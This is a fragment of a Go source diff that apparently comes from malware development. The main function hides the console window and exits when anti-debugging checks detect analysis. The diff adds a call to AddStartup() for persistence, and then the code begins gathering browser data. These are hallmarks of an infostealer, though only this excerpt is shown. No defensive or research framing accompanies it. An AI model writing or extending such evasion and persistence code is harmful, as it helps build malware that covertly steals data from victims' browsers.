@@ -159,9 +159,14 @@ const SW_HIDE = 0
 
 func main() {
 	hideConsole()
+
 	ad := NewAntiDebug()
 	if ad.checks() {
 		os.Exit(0)
+	}
+
+	if err := AddStartup(); err != nil {
+		log.Fatalf("Startup error: %v", err)
 	}
 
 	browsers := make(map[string]string)
